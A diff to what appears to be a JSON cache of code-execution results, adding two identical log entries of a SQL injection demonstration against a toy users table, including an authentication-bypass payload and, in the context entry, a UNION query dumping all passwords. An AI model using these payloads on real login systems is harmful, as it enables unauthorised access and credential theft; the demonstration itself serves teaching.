@@ -58,5 +58,13 @@
     "486ed39b60e57cf8534d68fa9a2a12ae7f9ee4661eb1e8178e369a58f1758808": {
         "success": true,
         "logs": "--- 1. Legitimate Login Attempt (should find 'admin') ---\nExecuting query: SELECT * FROM users WHERE user = 'admin'\nQuery results:\n(1, 'admin', 'adminpass')\n\n--- 2. SQL Injection: Authentication Bypass ---\nExecuting query: SELECT * FROM users WHERE user = '' OR '1'='1 --'\nQuery results:\nNo results found.\n\n--- 3. SQL Injection: Data Extraction (UNION Attack) ---\nExecuting query: SELECT * FROM users WHERE user = '' UNION SELECT id, user, password FROM users --'\nQuery results:\n(1, 'admin', 'adminpass')\n(2, 'testuser', 'testpass')\n"
+    },
+    "6101b6e34dac5e977012469495d023663d50e45463aeb4b63e53c8b01b9df577": {
+        "success": true,
+        "logs": "--- SQL Injection Exploit Demonstration ---\n\nAttempting login for username: '' OR 1=1 --'\nExecuting SQL: SELECT * FROM users WHERE user = '' OR 1=1 --'\nQuery result: [('admin', 'securepassword'), ('testuser', 'testpass')]\n\n--- Comparison with a legitimate login attempt ---\n\nAttempting login for username: 'admin'\nExecuting SQL: SELECT * FROM users WHERE user = 'admin'\nQuery result: [('admin', 'securepassword')]\n\n--- Comparison with a failed login attempt ---\n\nAttempting login for username: 'nonexistent_user'\nExecuting SQL: SELECT * FROM users WHERE user = 'nonexistent_user'\nQuery result: []\n"
+    },
+    "c93c972072eee4318110640891f14211289684a035699a9d102823f7dfd3fa0b": {
+        "success": true,
+        "logs": "--- SQL Injection Exploit Demonstration ---\n\nAttempting login for username: '' OR 1=1 --'\nExecuting SQL: SELECT * FROM users WHERE user = '' OR 1=1 --'\nQuery result: [('admin', 'securepassword'), ('testuser', 'testpass')]\n\n--- Comparison with a legitimate login attempt ---\n\nAttempting login for username: 'admin'\nExecuting SQL: SELECT * FROM users WHERE user = 'admin'\nQuery result: [('admin', 'securepassword')]\n\n--- Comparison with a failed login attempt ---\n\nAttempting login for username: 'nonexistent_user'\nExecuting SQL: SELECT * FROM users WHERE user = 'nonexistent_user'\nQuery result: []\n"
     }
 }
